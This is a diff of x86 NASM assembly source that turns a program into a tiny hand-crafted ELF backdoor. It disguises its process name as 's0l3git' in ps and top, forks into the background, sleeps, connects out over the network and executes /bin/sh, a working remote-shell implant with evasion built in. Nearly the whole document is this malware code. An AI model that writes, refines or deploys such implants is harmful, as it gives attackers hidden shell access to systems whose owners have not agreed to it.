@@ -11,15 +11,55 @@
 %define NR_EXIT 1
 %define NR_FORK 2
 %define NR_NANOSLEEP 0xa2
-%define NR_CLOCK_NANOSLEEP 0xa2
 %define NR_PRCTL 0xac
 
 %define PR_SET_NAME 15
 
 
+BITS 32
 global _start
 
-section .text
+
+            org     0x08048000
+ehdr:                                               ; Elf32_Ehdr
+            db      0x7F, "ELF"                     ;   e_ident
+            db      1, 1, 1, 0
+BIN_SH:
+            db      "/bin/sh", 0
+e_type:
+            dw      2                               ;   e_type
+            dw      3                               ;   e_machine
+            dd      1                               ;   e_version
+            dd      _start                          ;   e_entry
+            dd      phdr - $$                       ;   e_phoff
+            
+; These are 5 bytes, in place of e_shoff and e_flags (each 4 bytes)
+NEW_ARGV:
+            db      "s0l3git", 0   ; e_shoff, e_flags
+            
+            dw      ehdrsize                        ;   e_ehsize
+            dw      phdrsize                        ;   e_phentsize
+            dw      1                               ;   e_phnum
+_exit:
+            push NR_EXIT                            ;   e_shentsize
+            pop eax                                 ;   e_shnum
+            ; exit_code = random :D                 ;   e_shstrndx
+            int 0x80                              
+            db 0                        
+            
+ehdrsize equ     $ - ehdr
+
+phdr:                                               ; Elf32_Phdr
+            dd      1                               ;   p_type
+            dd      0                               ;   p_offset
+            dd      $$                              ;   p_vaddr
+            dd      $$                              ;   p_paddr
+            dd      filesize                        ;   p_filesz
+            dd      filesize                        ;   p_memsz
+            dd      5                               ;   p_flags
+            dd      0x1000                          ;   p_align
+
+phdrsize equ     $ - phdr
 
 
 ; change argv[0] which shows in ps/top, also PR_SET_NAME
@@ -42,7 +82,7 @@ _name:
     ; strncpy(&argv[0], NEW_ARGV, strlen(argv[0] + 1))
     mov edi, [esp]
     mov esi, NEW_ARGV
-    push _start - NEW_ARGV ; strlen(NEW_ARGV) + NULL-byte
+    push phdr - NEW_ARGV ; strlen(NEW_ARGV) + NULL-byte
     pop ecx
     _name_loop:
         movsb     ; edi[i] = esi[i] ; i+=1
@@ -70,10 +110,7 @@ _new_pid:
     jz sleep ; in child
     
     ;in parent
-    push NR_EXIT
-    pop eax
-    ; exit_code = random :D
-    int 0x80 
+    jmp _exit
     
     ; sleep(5)
     sleep:
@@ -87,8 +124,6 @@ _new_pid:
     ret
 
     
-NEW_ARGV:
-    db "s0l3git", 0
 
 ; --------------8<-----------------8<----------------
 ; The code below was originally taken from 
@@ -196,9 +231,7 @@ connect:
 	; edx = *envp
 execve_sh:
 	; eax == 0  since it was test'ed before jumping here
-    push dword 0x0068732f           ; push /sh\0
-    push dword 0x6e69622f           ; push /bin (=/bin/sh\0)
-    mov ebx, esp                    ; ebx =  ptr to "/bin/sh" into ebx
+    mov ebx, BIN_SH                 ; ebx =  ptr to "/bin/sh" into ebx
     push edx                        ; edx = 0x00000000
 	mov edx, esp                    ; edx = ptr to NULL address
 	push ebx                        ; pointer to /bin/sh. Stack = 0X00, /bin/sh, 0X00000000, &/bin/sh
@@ -207,3 +240,5 @@ execve_sh:
     mov ecx, esp                    ; ecx points to shell's argv[0] ( &NEW_ARGV )
     mov al, 0xb
     int 0x80                        ; execve /bin/sh
+
+filesize    equ     $ - $$
